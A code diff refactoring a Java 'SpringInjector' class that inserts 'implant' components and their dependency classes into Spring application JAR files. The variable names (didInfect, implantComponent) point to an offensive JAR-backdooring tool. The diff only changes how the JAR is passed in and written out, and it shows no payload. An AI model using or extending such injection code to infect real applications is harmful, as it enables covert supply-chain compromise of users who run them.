@@ -6,7 +6,6 @@ import javassist.bytecode.annotation.MemberValue;
 
 import java.io.DataInputStream;
 import java.io.IOException;
-import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
@@ -23,19 +22,18 @@ public class SpringInjector implements Injector {
         this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
-    public boolean inject(Path targetJarFilePath, Path outputJar) throws IOException {
+    public boolean inject(JarFiddler jar) throws IOException {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
 
-        if (jarLooksSigned(targetJarFilePath)) {
+        if (jarLooksSigned(jar)) {
             log.warning("JAR looks signed. This is not yet implemented. Aborting.");
             return false;
         }
 
-        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
         int countConfigModifications = 0;
         int countComponentsCreated = 0;
-        for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
+        for (BufferedJarFiddler.BufferedJarEntry entry : jar) {
             if (!entry.getName().endsWith(".class")) {
                 continue;
             }
@@ -64,10 +62,10 @@ public class SpringInjector implements Injector {
                 implantComponent.setName(renamedImplantComponentName.getFullClassName());
                 JarEntry newJarEntry = new JarEntry(renamedImplantComponentName.getSpringJarEntryPath());
                 try {
-                    fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
+                    jar.addNewEntry(newJarEntry, asByteArray(implantComponent));
                     countComponentsCreated++;
                 } catch (DuplicateEntryException e) {
-                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + outputJar + "'. Skipping.");
+                    log.warning("Class '" + newJarEntry + "' already exist in JAR '" + jar + "'. Skipping.");
                     break;
                 }
                 log.fine("Created implant class '" + newJarEntry.getName() + "'.");
@@ -118,7 +116,7 @@ public class SpringInjector implements Injector {
 
                 JarEntry newJarEntry = new JarEntry(className.getClassFilePath());
                 try {
-                    fiddler.addNewEntry(newJarEntry, fileContent);
+                    jar.addNewEntry(newJarEntry, fileContent);
                 } catch (DuplicateEntryException e) {
                     // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                     log.severe("Dependency file '" + className.getClassFilePath() + "' already exist. Aborting.");
@@ -126,13 +124,6 @@ public class SpringInjector implements Injector {
                     break;
                 }
             }
-        }
-
-        if (didInfect) {
-            fiddler.write(outputJar);
-            log.info("Wrote output JAR to '" + outputJar + "'.");
-        } else {
-            log.warning("No output JAR was written.");
         }
 
         return didInfect;
